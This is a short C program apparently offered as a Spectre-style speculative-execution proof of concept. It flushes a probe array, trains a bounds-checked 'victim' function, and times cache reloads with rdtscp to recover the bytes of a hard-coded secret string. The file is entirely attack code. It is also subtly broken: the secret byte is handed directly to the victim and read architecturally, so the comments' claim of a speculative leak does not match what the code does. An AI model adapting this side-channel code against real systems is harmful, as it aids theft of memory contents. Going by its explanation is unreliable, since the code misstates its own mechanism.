#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <intrin.h>

#define STRIDE 4096
#define CACHE_THRESHOLD 90

uint8_t target_array[256 * STRIDE];
char *secret_string = "L1G-Y*M47TR";
size_t boundary = 16;

// The "Victim" - This mimics a kernel or library function 
// that checks bounds before accessing an array.
void victim_function(size_t index, uint8_t secret_byte)
{
    if (index < boundary) 
    {
        // Speculative execution uses secret_byte to index target_array
        volatile uint8_t dummy = target_array[secret_byte * STRIDE];
    }
}

void leak_byte(uint8_t byte_to_leak, int char_pos) 
{
    unsigned int junk = 0;
    int hits[256] = {0};
    uint64_t timings[256] = {0};

    // 1. Flush the target array
    for (int i = 0; i < 256; i++) _mm_clflush(&target_array[i * STRIDE]);
        _mm_mfence();

    // 2. Train and Attack
    for (int i = 50; i >= 0; i--) 
    {
        _mm_clflush(&boundary); // Force a slow boundary check
        for (volatile int z = 0; z < 100; z++); // Settle pipeline

        // Train 5 times with index 0, then attack once with index 999
        size_t training_index = (i % 6 == 0) ? 999 : 0;
        victim_function(training_index, byte_to_leak);
    }
    _mm_mfence();

    // 3. Measure - Probe all 256 possible byte values
    for (int i = 0; i < 256; i++) 
    {
        int mixed_i = ((i * 167) + 13) & 255; 
        uint64_t t1 = __rdtscp(&junk);
        volatile uint8_t val = target_array[mixed_i * STRIDE];
        uint64_t t2 = __rdtscp(&junk);
        
        uint64_t delta = t2 - t1;
        if (delta < CACHE_THRESHOLD && mixed_i != 0) {
            hits[mixed_i]++;
            timings[mixed_i] = delta;
        }
    }

    // 4. Verbose Report for this specific character position
    printf("Pos %2d | Reading char... ", char_pos);
    for (int i = 0; i < 256; i++) 
    {
        if (hits[i] > 0)
            printf("[Byte: %d ('%c') | Time: %llu cycles] ", i, (i > 31 && i < 127) ? i : '?', timings[i]);
    }
    printf("\n");
}

int main() 
{
    memset(target_array, 1, sizeof(target_array));
    printf("\nBoundary: %zu | Stride: %d | Threshold: %d\n\n", boundary, STRIDE, CACHE_THRESHOLD);

    for (int i = 0; i < strlen(secret_string); i++)
        leak_byte((uint8_t)secret_string[i], i);
    

    return 0;
}